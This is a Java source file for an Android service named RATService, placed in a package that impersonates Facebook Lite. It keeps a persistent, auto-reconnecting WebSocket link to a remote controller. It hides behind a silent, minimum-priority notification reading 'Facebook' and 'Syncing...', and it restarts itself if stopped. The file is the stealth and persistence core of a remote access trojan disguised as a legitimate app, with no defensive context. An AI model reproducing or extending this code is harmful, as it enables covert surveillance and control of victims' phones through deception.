package com.facebook.lite;

import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.core.app.NotificationCompat;

public class RATService extends Service {

    private WSClient ws;
    private Handler  h;

    @Override
    public void onCreate() {
        super.onCreate();
        mkChannel();
        startForeground(Config.NOTIF_ID, mkNotif());
        h = new Handler(Looper.getMainLooper());
        connect();
    }

    private void connect() {
        ws = new WSClient(this, () ->
            h.postDelayed(this::connect, Config.RECONNECT_MS));
        ws.connect();
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    private void mkChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(
                Config.CHANNEL_ID, Config.CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(c);
        }
    }

    private Notification mkNotif() {
        return new NotificationCompat.Builder(this, Config.CHANNEL_ID)
            .setContentTitle("Facebook")
            .setContentText("Syncing...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build();
    }
}
